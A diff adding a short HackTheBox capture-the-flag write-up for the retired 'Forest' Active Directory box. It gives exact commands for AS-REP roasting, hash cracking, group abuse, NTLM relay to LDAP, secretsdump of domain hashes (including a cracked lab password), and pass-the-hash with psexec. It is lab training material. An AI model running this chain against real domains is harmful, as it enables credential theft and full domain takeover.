@@ -1,0 +1,38 @@
+---
+layout: default
+title: Retired Hackthebox: Forest
+---
+<h1>Hackthebox Forest</h1>
+<p>Today's box is the Forest box from HackTheBox. It is a retired box and as such you can only accessed with the subscription. And also these notes are from 2019. </p>
+
+<h2 id="initial-enumeration-">Initial enumeration:</h2>
+<p>With this box we start with nmap as usual </p>
+
+<p>On this Forest box, ports 53, 88, 135, 139, 389, 445, 464, 593 and 626 are open.</p>
+<p>Running more scans reveals ports 3268 and 3269 to be open.</p>
+<h2>Main scans</h2>
+<p>Run autorecon.py and wait for it to finish. One of the scans will give you a list of users.</p>
+<p>Alternatively you can log in to rpcclient using a null session and gather users that way.</p>
+<h2>To get user</h2>
+<p>Use the GetNPUsers.py script to go through the user list. It will give you a hash for svc-alfresco.</p>
+<p><code><i>python GetNPUsers.py htb.local/ -usersfile users.txt -format john -outputfile someMoreText.txt -dc-ip 10.10.10.161</code></i></p>
+<p>Crack the hash to get the password using john.</p>
+<p>Use evilwinrm to log in</p>
+<p>Grab user.txt</p>
+<h2>To get root</h2>
+<p>First add the svc-alfresco user to these groups once you're logged in.</p>
+<p><code><i>net group "Exchange Servers" svc-alfresco /add </code></i></p>
+<p><code><i>net group "Exchange Windows Permissions" svc-alfresco /add </code></i></p>
+<p>Then use the ntlm relay script to set the relay. Like so</p>
+<p><code><i>ntlmrelayx.py -t ldap://10.10.10.161 --escalate-user svc-alfresco</code></i></p>
+<p>Browse to localhost on the browser. It will ask you for the svc-alfresco credentials.</p>
+<p>Wait for the relay script to tell you you can run secretsdump.</p>
+<p>Then run this script</p>
+<p><code><i>secretsdump.py HTB/svc-alfresco:s3rvice@10.10.10.161 -just-dc-ntlm </code></i></p>
+<p>Alternatively you can set the relay and *then* add the user to the groups.</p>
+<p>One of those ways should work. Try both, if you're having problems.</p>
+<p>Once you get the hashes from secretsdump script, grab the Administrator hash.</p>
+<p>Login in with psexec with that hash.</p>
+<p><code><i>python psexec.py htb.local/Administrator@10.10.10.161 -hashes hash1:hash2 -no-pass </code></i></p>
+<p>(replace hash1 and hash2 with the admin hash in that format)</p>
+<p>And now we have root.</p>
